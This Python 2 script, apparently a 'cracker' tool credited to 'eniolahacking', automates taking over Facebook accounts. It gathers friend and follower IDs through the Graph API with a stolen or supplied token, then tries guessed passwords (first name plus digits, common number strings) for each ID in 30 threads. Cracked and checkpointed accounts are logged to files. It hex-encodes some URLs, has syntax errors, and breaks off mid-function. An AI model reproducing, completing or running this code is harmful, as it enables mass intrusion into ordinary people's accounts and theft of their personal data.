#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : eniolahacking (MR. EFK)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO MR. EFK

P = "\033[97;1m" 
M = "\033[91;1m" 
H = "\033[92;1m" 
K = "\033[93;1m" 
B = "\033[94;1m" 
U = "\033[95;1m" 
O = "\033[93;1m" 
N = "\033[0m"

try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 uck.py")

from os import system
from time import sleep

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
      
agents = [
					"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
					"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
					"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
					"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
					"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
					"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
				  ]
				
header = {"user-agent": '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
					  "x-fb-net-hni": str(random.randint(20000, 40000)),
					  "x-fb-connection-quality": "EXCELLENT",
					  "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
					  "content-type": "application/x-www-form-urlencoded",
					  "x-fb-http-engine": "Liger"
					  }
					
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])

try:
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
	sys.exit()
	
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
	
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n  ███████  ▒ ▒ ▒ ███████     █           █\n  █                               █                      █         █\n  █                               █                      █      █\n  ███████              ███████    █   █\n█                               █                      █       █\n   ███████              █                      █         █\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { uck }        ║\n    ║ AUTHOR   : ENIOLA HACKING        ║\n    ║ GITHUB   : git.io/eniolahacking     ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      MAIN MENU\x1b[0m")
	print("")
        print("")
	print(" \x1b[1;92m  \t(Login menu)")
	print("")
	print(47*"-")
	print("\x1b[1;92m[1]\x1b[1;93m Login with Facebook\n")
	print("\x1b[1;92m[2]\x1b[1;93m Login with token \x1b[1;92m[BEST]\n")
	print("\x1b[1;92m[3]\x1b[1;93m Back ")
	print(47*"\x1b[1;92m-")
	print("")
        log_sel()

def log_sel()
	sel = raw_input("\x1b[1;92m Choose option: ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="3":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        
        token = raw_input        ("\x1b[1;93m Paste token :\x1b[1;92m ")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("\x1b[1;92m            WELLCOME : "+name)
    print("")
    print(47*"-")
    print ' \x1b[1;92mLoggin in user: ' + z
    print ''
    print ' \x1b[1;93mActive token: ' + tok
    print 47 * '-'
    print '\x1b[1;92m[1] Crack With Auto Pass '
    print '\x1b[1;92m[2] Crack With Number Pass '
    print '\x1b[1;92m[3] Crack With Name+Digit Pass'
    print '\x1b[1;92m[4] Crack With Name+Digit And Digit Pass'
    print '\x1b[1;92m[5] Creating File From Follower'
    print '\x1b[1;92m[6] Creating File From Public Friends'
    print '\x1b[1;92m[7] Logout'
    print '\x1b[1;92m[8] Remove Junk Files'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;93mSelect One : ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        digit_crack()
    elif ms == '5':
        ex_id_flo()
    elif ms == '6':
        ex_id()
    elif ms == '7':
        lout()
    elif ms == '8':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ AUTO PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ AUTO PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' Select One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ AUTO PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~AUTO PASS PUBLIC CRACKING~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ AUTO PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~ AUTO PASS FOLLOWERS CRACKING ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;97m~~~~ AUTO PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        try:
            idlist = raw_input(' \x1b[1;96m[\xe2\x98\x85] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass1
                cp = open('ITZEFK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ITZEFKS-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass2
                    cp = open('ITZEFK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass3
                        cp = open('ITZEFK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass4
                            cp = open('ITZEFK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name.lower()
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass5
                                cp = open('ITZEFK_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass6
                                    cp = open('ITZEFK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass7
                                        cp = open('ITZEFK_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass8
                                            cp = open('ITZEFK_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '223344'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass9
                                                cp = open('JITZEFK_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 =  '234567'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[ITZEFK-HACKED\xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ITZEFK_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NUMBER PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NUMBER PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;91mSelect One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m ~~~~ NUMBER PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x855]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93m ~~~~ NUMBER PASS PUBLIC CRACKING ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NUMBER PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        idt = raw_input(' \x1b[1;93mEnter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93~~~~ NUMBER PASS FOLLOWERS CRACKING ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m ~~~~ NUMBER PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[\xe2\x98\x85] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91m~~~ Crack Running ~~~\x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass1
                cp = open('ITZEFK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JITZEFK-CP] ' + uid + ' | ' + pass2
                    cp = open('ITZEFK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass3
                        cp = open('ITZEFK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass4
                            cp = open('ITZEFK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ITZEFK-HACKED \xf0\x9f\x92\x89] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/ITZEFK_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[ITZEFK-CP] ' + uid + ' | ' + pass5
                                cp = open('ITZEFK_CP.txt', 'a')
